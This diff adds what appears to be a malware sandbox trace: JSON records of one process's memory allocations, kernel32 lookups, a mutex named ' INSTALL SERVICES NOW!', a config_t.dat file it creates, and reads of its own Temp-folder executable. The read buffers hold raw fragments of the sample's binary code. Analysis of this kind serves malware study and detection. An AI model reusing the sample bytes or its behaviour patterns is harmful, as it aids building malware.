@@ -1,0 +1,947 @@
+{}
+{
+  "process_identifier": 2404,
+  "region_size": 1310720,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 8192,
+  "base_address": "0x013a0000"
+}
+{
+  "free_type": 32768,
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff",
+  "base_address": "0x013a0000",
+  "size": 1245184
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x014d0000"
+}
+{
+  "module_name": "KERNEL32.DLL",
+  "stack_pivoted": 0,
+  "module_address": "0x77490000"
+}
+{
+  "ordinal": 0,
+  "module": "kernel32",
+  "module_address": "0x77490000",
+  "function_address": "0x774e418d",
+  "function_name": "FlsAlloc"
+}
+{
+  "ordinal": 0,
+  "module": "kernel32",
+  "module_address": "0x77490000",
+  "function_address": "0x774e1e16",
+  "function_name": "FlsGetValue"
+}
+{
+  "ordinal": 0,
+  "module": "kernel32",
+  "module_address": "0x77490000",
+  "function_address": "0x774e76e6",
+  "function_name": "FlsSetValue"
+}
+{
+  "ordinal": 0,
+  "module": "kernel32",
+  "module_address": "0x77490000",
+  "function_address": "0x774e1f61",
+  "function_name": "FlsFree"
+}
+{
+  "module_name": "KERNEL32.DLL",
+  "stack_pivoted": 0,
+  "module_address": "0x77490000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x014d1000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x014d2000"
+}
+{}
+{
+  "desired_access": "0x0000000f",
+  "dirpath_r": "\\Sessions\\1\\BaseNamedObjects",
+  "dirpath": "\\Sessions\\1\\BaseNamedObjects",
+  "directory_handle": "0x00000044"
+}
+{
+  "initial_owner": 1,
+  "desired_access": "0x001f0001",
+  "mutant_name": " INSTALL SERVICES NOW!",
+  "mutant_handle": "0x00000048"
+}
+{
+  "handle": "0x00000048"
+}
+{
+  "create_disposition": 5,
+  "file_handle": "0x00000048",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "desired_access": "0xc0100080",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system\\config_t.dat",
+  "create_options": 96,
+  "status_info": 2,
+  "share_access": 3
+}
+{
+  "handle": "0x00000048"
+}
+{
+  "create_disposition": 1,
+  "file_handle": "0x00000048",
+  "filepath": "C:\\Users\\faker\\AppData\\Local\\Temp\\4b77375187d1ef7054f6a805cacd2704a59796571ac9e86675a99e10d18048e8.exe",
+  "desired_access": "0x80100080",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Users\\faker\\AppData\\Local\\Temp\\4b77375187d1ef7054f6a805cacd2704a59796571ac9e86675a99e10d18048e8.exe",
+  "create_options": 96,
+  "status_info": 1,
+  "share_access": 3
+}
+{
+  "file_handle": "0x00000048"
+}
+{
+  "file_handle": "0x00000048",
+  "move_method": 0,
+  "offset": 688
+}
+{
+  "process_identifier": 2404,
+  "region_size": 8192,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x014d3000"
+}
+{
+  "file_handle": "0x00000048",
+  "buffer": "VJJN\u0004\u0011\u0011MKPMVWP[\u0010\u000b\u0007\u0010GZRW\u0010P[J\u0011M[MNQL\u0011YPM_JDS\u0011TUPSR\u0011_P[GIMX\u0010_MN\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Uì}\b\u0000t\u001bE\fÀt\u0014U\b+Ð\b\f\u0002@ÉuöE\b]Ã3À]ÃUìQV3öÇEüjwy79u\f~7Æ÷}\fÆà\u0003ÊÁù\u00102L\u0005üÂÁø\b2ÈE\b2Ñ\f\u0006\u0001Àt\b:Ât\u00042Â\u0001F;u\f|É^ÉÃÃ3ÀÂ\u0004\u0000Uìì\u0018¡ ÆC\u00003ÅEüVu\bWj\u00023ÿWWÿ\u0015\u0010Ð@\u0000Eè;ÇtiSh\u0010\u0000\u0001\u0000VPÿ\u0015\u0014Ð@\u00005\u0018Ð@\u0000Ø;ßtIj\u0010EìWPè\u0017\u000f\u0000\u0000EìhÌÑ@\u0000Pè\u000e\u0000\u0000EìhÀÑ@\u0000Pè\r\u0000\u0000Ä\u001ch°Ñ@\u0000ÿ\u0015hÐ@\u0000MìQPÿ\u0015pÐ@\u0000WWSÿÐSÿÖÿuèÿÖ[Mü_3Í^èB\u000f\u0000\u0000ÉÃUì3Ò9U\f~\u0016E\b\f\u0002\u0001Àt\u00044>\u0001B;U\f|ê]ÃUìì0\u0005\u0000\u0000¡ ÆC\u00003ÅEüSW3ÿ»\u0004\u0001\u0000\u0000SìúÿÿP½äúÿÿ½àúÿÿ½Üúÿÿ½Ðúÿÿ½Ôúÿÿ½Øúÿÿÿ\u0015TÐ@\u0000ìúÿÿPxþÿÿhDÒ@\u0000Pè¶\r\u0000\u0000Ä\fWh\u0000\u0000\u0000j\u0002Wj\u0003h\u0000\u0000\u0000ÀxþÿÿPÿ\u0015XÐ@\u0000øÿu\u00073Àé|\u0004\u0000\u0000VPÿ\u0015\\Ð@\u0000SðûÿÿPWÿ\u0015`Ð@\u0000ðûÿÿh@Ò@\u0000Pè.\u0013\u0000\u0000ðYY;÷\u000fE\u0004\u0000\u0000h\u0000\u0000\u0000øýÿÿWPèÌ\r\u0000\u0000Wh°\u0002\u0000\u0000VèÌ\u0011\u0000\u0000Vh\u0000\u0000\u0000øýÿÿj\u0001Pè\u0011\u0011\u0000\u0000øýÿÿh\u0000\u0000\u0000PèÕþÿÿøýÿÿPè\u001f\u000e\u0000\u0000Ä4À\u000fë\u0003\u0000\u0000SôüÿÿWPèv\r\u0000\u0000øýÿÿP»<Ò@\u0000ôüÿÿSPèÕ\f\u0000\u0000Wh0\u0003\u0000\u0000Vè]\u0011\u0000\u0000Vj\u0002äúÿÿj\u0001Pè¥\u0010\u0000\u0000Ä49½äúÿÿ\u007f\nÇäúÿÿ\n\u0000\u0000\u0000Wh2\u0003\u0000\u0000Vè+\u0011\u0000\u0000Vj\u0002àúÿÿj\u0001Pès\u0010\u0000\u0000Ä\u001c9½àúÿÿ\u007f\nÇàúÿÿ\u0000\u0000\u0000Wh4\u0003\u0000\u0000Vèù\u0010\u0000\u0000Vj\u0001Üúÿÿj\u0001PèA\u0010\u0000\u0000Ä\u001c9½Üúÿÿ\u000fY\u0001\u0000\u0000j EÜWPèÁ\f\u0000\u0000Wh5\u0003\u0000\u0000VèÁ\u0010\u0000\u0000Vj EÜj\u0001Pè\f\u0010\u0000\u0000EÜj PèÖýÿÿEÜPè#\r\u0000\u0000Ä4À\u000fï\u0002\u0000\u0000j E¼WPè|\f\u0000\u0000EÜPE¼SPèæ\u000b\u0000\u0000WhU\u0003\u0000\u0000Vèn\u0010\u0000\u0000Vj\u0002Ôúÿÿj\u0001Pè¶\u000f\u0000\u0000Ä49½Ôúÿÿ\u000f©\u0002\u0000\u0000j EÜWPè6\f\u0000\u0000WhW\u0003\u0000\u0000Vè6\u0010\u0000\u0000Vj EÜj\u0001Pè\u000f\u0000\u0000EÜj PèKýÿÿj |ÿÿÿWPè\u0002\f\u0000\u0000EÜP|ÿÿÿSPèi\u000b\u0000\u0000ÄHj EÜWPèâ\u000b\u0000\u0000Whw\u0003\u0000\u0000Vèâ\u000f\u0000\u0000Vj EÜj\u0001Pè-\u000f\u0000\u0000EÜj Pè÷üÿÿj EWPè±\u000b\u0000\u0000EÜPESPè\u001b\u000b\u0000\u0000ÄHWh\u0003\u0000\u0000Vè \u000f\u0000\u0000Vj\u0002Øúÿÿj\u0001Pèè\u000e\u0000\u0000Ä\u001c9½Øúÿÿ\u000fÛ\u0001\u0000\u0000Wh\u0003\u0000\u0000Vèt\u000f\u0000\u0000Vj\u0001Ðúÿÿj\u0001Pè¼\u000e\u0000\u00005dÐ@\u0000Ä\u001cxþÿÿPôüÿÿPh4Ò@\u0000»,Ò@\u0000SÿÖj\u0004èúÿÿWPè$\u000b\u0000\u0000ÿµäúÿÿèúÿÿh(Ò@\u0000Pè\n\u0000\u0000Ä\u0018xþÿÿPèúÿÿPh\u001cÒ@\u0000SÿÖj\u0004èúÿÿWPèå\n\u0000\u0000ÿµàúÿÿèúÿÿh(Ò@\u0000PèF\n\u0000\u0000Ä\u0018xþÿÿPèúÿÿPh\u0010Ò@\u0000SÿÖxþÿÿP9½Üúÿÿ\u000fÌ\u0000\u0000\u0000h\fÒ@\u0000h\bÒ@\u0000»\u0000Ò@\u0000SÿÖxþÿÿPE¼PhüÑ@\u0000SÿÖj\u0004èúÿÿWPèn\n\u0000\u0000ÿµÔúÿÿèúÿÿh(Ò@\u0000PèÏ\t\u0000\u0000Ä\u0018xþÿÿPèúÿÿPhøÑ@\u0000SÿÖxþÿÿP|ÿÿÿPhôÑ@\u0000SÿÖxþÿÿPEPhðÑ@\u0000SÿÖj\u0004èúÿÿWPè\u0006\n\u0000\u0000ÿµØúÿÿèúÿÿh(Ò@\u0000Pèg\t\u0000\u0000Ä\u0018xþÿÿPèúÿÿPhìÑ@\u0000Së\u000fhèÑ@\u0000h\bÒ@\u0000h\u0000Ò@\u0000ÿÖxþÿÿP9½Ðúÿÿt\u0007h\fÒ@\u0000ë\u0005hèÑ@\u0000hÜÑ@\u0000hÐÑ@\u0000ÿÖ3À@ë\u00023À^Mü_3Í[è\u0004\n\u0000\u0000ÉÃUìjÿhjÌ@\u0000d¡\u0000\u0000\u0000\u0000PQ¸¤(\u0003\u0000èì\u0019\u0000\u0000¡ ÆC\u00003ÅEìSVWPEôd£\u0000\u0000\u0000\u0000eðj\u0007Y¾lÓ@\u0000}¬ó¥3Ûf¥E¬hTÓ@\u0000P×üÿÇ×üÿ\u0002\u0000\u0000×üÿ×üÿ×üÿ]ü¤è\u0007\u0000\u0000YY×üÿPj\u0001SE¬Pÿµ×üÿÿ\u0015\u001cÐ@\u0000;Ãt\u001bÇd×üÿPÓ@\u0000h`õ@\u0000d×üÿPè}\u0019\u0000\u0000`×üÿP¤ùÿÿPL×üÿPShHÓ@\u0000ÿµ×üÿÇ`×üÿ\u0000\u0004\u0000\u0000ÿ\u0015\u0000Ð@\u0000ÿµ×üÿðÿ\u0015\u0004Ð@\u0000Vÿ\u0015@Ð@\u0000;ót\u0017Çh×üÿPÓ@\u0000h`õ@\u0000h×üÿëh?\u0000\u000f\u0000SSÿ\u0015\u0010Ð@\u0000×üÿ;Ãu\u001aÇ|×üÿPÓ@\u0000h`õ@\u0000|×üÿéhÿÿÿ¾\u0004\u0001\u0000\u0000V¤ýÿÿPÿ\u0015lÐ@\u0000½¤ùÿÿ8\u001f\u000fø\u0000\u0000\u0000h@Ó@\u0000Wè$\u0014\u0000\u0000YYÀ\u000fÒ\u0000\u0000\u0000W°÷ÿÿh\u0018Ó@\u0000Pÿ\u0015hÑ@\u0000Ä\f×üÿPj\u0001S°÷ÿÿPh\u0002\u0000\u0000ÿ\u0015\u001cÐ@\u0000;Ãu\u0011ÿµ×üÿÿ\u0015\u0004Ð@\u0000é\u0000\u0000\u0000V¨þÿÿSPèµ\u0007\u0000\u0000W¤ýÿÿP¨þÿÿh\fÓ@\u0000Pÿ\u0015hÑ@\u0000Ä\u001c¨þÿÿPÿ\u00158Ð@\u0000¨þÿÿPÿ\u00154Ð@\u0000øÿuAh°Ñ@\u0000ÿ\u0015hÐ@\u0000hüÒ@\u0000Pÿ\u0015pÐ@\u0000SSSSS¹ÌÒ@\u0000Qj\u0001j\u0002j hÿ\u0001\u000f\u0000WWÿµ×üÿÿÐ×üÿ;Ãu SWèñ\u0004\u0000\u0000YYx\u0001é\u0000ÿÿÿ9×üÿu\u00073ÀéÒ\u0003\u0000\u0000Wÿ\u00150Ð@\u0000@Pè\u0012\u0000\u0000YWP×üÿÿ\u0015,Ð@\u00009×üÿu\u001aÇx×üÿPÓ@\u0000h`õ@\u0000x×üÿé\u0001þÿÿÿµ×üÿ=\u0018Ð@\u0000ÿ×ÿµ×üÿÿ×h\u0000\u0004\u0000\u0000¤ùÿÿh¨Ò@\u0000PÇ×üÿ\u0002\u0000\u0000è³\u0010\u0000\u0000jdÿµ×üÿ¤ùÿÿPè_\u000f\u0000\u0000Ä\u0018×üÿPh?\u0000\u000f\u0000S¤ùÿÿPÿµ×üÿÿ\u0015\u001cÐ@\u0000;Ãt\u001aÇt×üÿPÓ@\u0000h`õ@\u0000t×üÿévýÿÿ5(Ð@\u0000j\nÇl×üÿ \u0001\u0000\u0000ÿÖj\u0004l×üÿPj\u0004Sh Ò@\u0000ÿµ×üÿÿ\u0015\bÐ@\u0000P×üÿÿ\u0015@Ð@\u00009×üÿt\u001aÇ×üÿPÓ@\u0000h`õ@\u0000×üÿé\u0016ýÿÿj\nÿÖ×üÿPhÒ@\u0000ÿµ×üÿÿ\u0015\fÐ@\u0000P×üÿÿ\u0015@Ð@\u00009×üÿt\u001aÇ\\×üÿPÓ@\u0000h`õ@\u0000\\×üÿéËüÿÿEÌhÒ@\u0000Pè\r\u0005\u0000\u0000EÌhÒ@\u0000Pè\u0017\u0004\u0000\u0000¨þÿÿPè\u000b\u0006\u0000\u0000Ä\u0014@P¨þÿÿPj\u0002SEÌPÿµ×üÿÿ\u0015\bÐ@\u0000P×üÿÿ\u0015@Ð@\u00009×üÿt\u001aÇp×üÿPÓ@\u0000h`õ@\u0000p×üÿéUüÿÿMüÿë.X×üÿ3Û;Ãt\n8\u0018t\u0006ÿ\u0015$Ð@\u0000Müÿ¸Ù\u001a@\u0000Ã=\u0018Ð@\u00005(Ð@\u00003Ûÿµ×üÿÿ\u0015\u0004Ð@\u0000ÿµ×üÿÿ\u0015\u0004Ð@\u0000ÿµ×üÿÿ×ÿµ×üÿÿ×9×üÿ\u000fy\u0001\u0000\u0000Sh\u0000\u0000\u0000j\u0002SSh\u0000\u0000\u0000@¨þÿÿPÿ\u0015XÐ@\u0000×üÿøÿ\u000fN\u0001\u0000\u0000j\u0010 ×üÿSPè\u0004\u0000\u0000Ä\fj\b¸Ô\u0007\u0000\u0000f ×üÿXj\u0011f¢×üÿXj\u0014f¦×üÿXf¨×üÿ3Àj\nfª×üÿÿÖP×üÿP ×üÿPÿ\u0015<Ð@\u0000×üÿPP×üÿPÿ\u0015PÐ@\u0000=hÐ@\u0000hxÒ@\u0000ÿ×hlÒ@\u0000Pÿ\u0015pÐ@\u0000×üÿQSQÿµ×üÿÿÐhÿ\u001f\u0003\u0000±×üÿSP×üÿ°×üÿèá\u0003\u0000\u0000h\u0000¶\u0002\u0000°×üÿh\u0000\u0010A\u0000Pè+\t\u0000\u0000°×üÿh\u0000¶\u0002\u0000Pè\u0002ôÿÿÄ hxÒ@\u0000ÿ×j\u0010øEÜSPè¢\u0003\u0000\u0000EÜhdÒ@\u0000Pè\f\u0003\u0000\u0000EÜh\\Ò@\u0000Pè\u0016\u0002\u0000\u0000Ä\u001cj\nÿÖEÜPWÿ\u0015pÐ@\u0000S×üÿQh\u0000 \u0003\u0000°×üÿQÿµ×üÿÿÐÿµ×üÿÿ\u0015\\Ð@\u0000×üÿMôd\r\u0000\u0000\u0000\u0000Y_^[Mì3Íè¨\u0003\u0000\u0000ÉÃUìì\f\u0002\u0000\u0000¡ ÆC\u00003ÅEüVhÓ@\u0000j\u0001j\u0000ÿ\u0015LÐ@\u0000ðÿ\u0015$Ð@\u0000=·\u0000\u0000\u0000\u000f\u0000\u0000\u0000ø\u0005\u000f\u0000\u0000\u0000Vÿ\u0015HÐ@\u0000Vÿ\u0015\\Ð@\u0000è6ôÿÿÀtshv\u0010@\u0000ÿ\u0015DÐ@\u0000è>ùÿÿðöt]VèUóÿÿøþÿÿÇ\u0004$\u0004\u0001\u0000\u0000Pÿ\u0015TÐ@\u0000øþÿÿPôýÿÿhDÒ@\u0000Pÿ\u0015hÑ@\u0000Ä\fj\nÿ\u0015(Ð@\u0000ôýÿÿPVhÓ@\u0000h,Ò@\u0000ÿ\u0015dÐ@\u0000Vè¬\u0013\u0000\u0000YMü3Í3À^èÐ\u0002\u0000\u0000ÉÂ\u0010\u0000ÌÌBÿ[Ã¤$\u0000\u0000\u0000\u0000d$\u00003ÀD$\bSØÁà\bT$\b÷Â\u0003\u0000\u0000\u0000t\u0015\nÂ\u0001:ËtÏÉtQ÷Â\u0003\u0000\u0000\u0000uë\u000bØWÃÁã\u0010V\u000bØ\n¿ÿþþ~Á÷3Ë\u0003ð\u0003ùñÿðÿ3Ï3ÆÂ\u0004á\u0000\u0001\u0001u\u001c%\u0000\u0001\u0001tÓ%\u0000\u0001\u0001\u0001u\bæ\u0000\u0000\u0000uÄ^_[3ÀÃBü:Ãt6Àtï:ãt'ätçÁè\u0010:Ãt\u0015ÀtÜ:ãt\u0006ätÔë^_Bÿ[ÃBþ^_[ÃBý^_[ÃBü^_[ÃÌÌW|$\bën¤$\u0000\u0000\u0000\u0000ÿL$\u0004W÷Á\u0003\u0000\u0000\u0000t\u0013\u0001Á\u0001Àt=÷Á\u0003\u0000\u0000\u0000uïÿ\u0001ºÿþþ~\u0003Ððÿ3ÂÁ\u0004©\u0000\u0001\u0001tèAüÀt#",
+  "length": 4096,
+  "offset": 0
+}
+{
+  "file_handle": "0x00000048",
+  "move_method": 0,
+  "offset": 816
+}
+{
+  "file_handle": "0x00000048",
+  "buffer": "\n\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Uì}\b\u0000t\u001bE\fÀt\u0014U\b+Ð\b\f\u0002@ÉuöE\b]Ã3À]ÃUìQV3öÇEüjwy79u\f~7Æ÷}\fÆà\u0003ÊÁù\u00102L\u0005üÂÁø\b2ÈE\b2Ñ\f\u0006\u0001Àt\b:Ât\u00042Â\u0001F;u\f|É^ÉÃÃ3ÀÂ\u0004\u0000Uìì\u0018¡ ÆC\u00003ÅEüVu\bWj\u00023ÿWWÿ\u0015\u0010Ð@\u0000Eè;ÇtiSh\u0010\u0000\u0001\u0000VPÿ\u0015\u0014Ð@\u00005\u0018Ð@\u0000Ø;ßtIj\u0010EìWPè\u0017\u000f\u0000\u0000EìhÌÑ@\u0000Pè\u000e\u0000\u0000EìhÀÑ@\u0000Pè\r\u0000\u0000Ä\u001ch°Ñ@\u0000ÿ\u0015hÐ@\u0000MìQPÿ\u0015pÐ@\u0000WWSÿÐSÿÖÿuèÿÖ[Mü_3Í^èB\u000f\u0000\u0000ÉÃUì3Ò9U\f~\u0016E\b\f\u0002\u0001Àt\u0004",
+  "length": 512,
+  "offset": 0
+}
+{
+  "file_handle": "0x00000048",
+  "move_method": 0,
+  "offset": 818
+}
+{
+  "file_handle": "0x00000048",
+  "buffer": "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Uì}\b\u0000t\u001bE\fÀt\u0014U\b+Ð\b\f\u0002@ÉuöE\b]Ã3À]ÃUìQV3öÇEüjwy79u\f~7Æ÷}\fÆà\u0003ÊÁù\u00102L\u0005üÂÁø\b2ÈE\b2Ñ\f\u0006\u0001Àt\b:Ât\u00042Â\u0001F;u\f|É^ÉÃÃ3ÀÂ\u0004\u0000Uìì\u0018¡ ÆC\u00003ÅEüVu\bWj\u00023ÿWWÿ\u0015\u0010Ð@\u0000Eè;ÇtiSh\u0010\u0000\u0001\u0000VPÿ\u0015\u0014Ð@\u00005\u0018Ð@\u0000Ø;ßtIj\u0010EìWPè\u0017\u000f\u0000\u0000EìhÌÑ@\u0000Pè\u000e\u0000\u0000EìhÀÑ@\u0000Pè\r\u0000\u0000Ä\u001ch°Ñ@\u0000ÿ\u0015hÐ@\u0000MìQPÿ\u0015pÐ@\u0000WWSÿÐSÿÖÿuèÿÖ[Mü_3Í^èB\u000f\u0000\u0000ÉÃUì3Ò9U\f~\u0016E\b\f\u0002\u0001Àt\u00044>",
+  "length": 512,
+  "offset": 0
+}
+{
+  "file_handle": "0x00000048",
+  "move_method": 0,
+  "offset": 820
+}
+{
+  "file_handle": "0x00000048",
+  "buffer": "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Uì}\b\u0000t\u001bE\fÀt\u0014U\b+Ð\b\f\u0002@ÉuöE\b]Ã3À]ÃUìQV3öÇEüjwy79u\f~7Æ÷}\fÆà\u0003ÊÁù\u00102L\u0005üÂÁø\b2ÈE\b2Ñ\f\u0006\u0001Àt\b:Ât\u00042Â\u0001F;u\f|É^ÉÃÃ3ÀÂ\u0004\u0000Uìì\u0018¡ ÆC\u00003ÅEüVu\bWj\u00023ÿWWÿ\u0015\u0010Ð@\u0000Eè;ÇtiSh\u0010\u0000\u0001\u0000VPÿ\u0015\u0014Ð@\u00005\u0018Ð@\u0000Ø;ßtIj\u0010EìWPè\u0017\u000f\u0000\u0000EìhÌÑ@\u0000Pè\u000e\u0000\u0000EìhÀÑ@\u0000Pè\r\u0000\u0000Ä\u001ch°Ñ@\u0000ÿ\u0015hÐ@\u0000MìQPÿ\u0015pÐ@\u0000WWSÿÐSÿÖÿuèÿÖ[Mü_3Í^èB\u000f\u0000\u0000ÉÃUì3Ò9U\f~\u0016E\b\f\u0002\u0001Àt\u00044>\u0001",
+  "length": 512,
+  "offset": 0
+}
+{
+  "file_handle": "0x00000048",
+  "move_method": 0,
+  "offset": 921
+}
+{
+  "file_handle": "0x00000048",
+  "buffer": "\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Uì}\b\u0000t\u001bE\f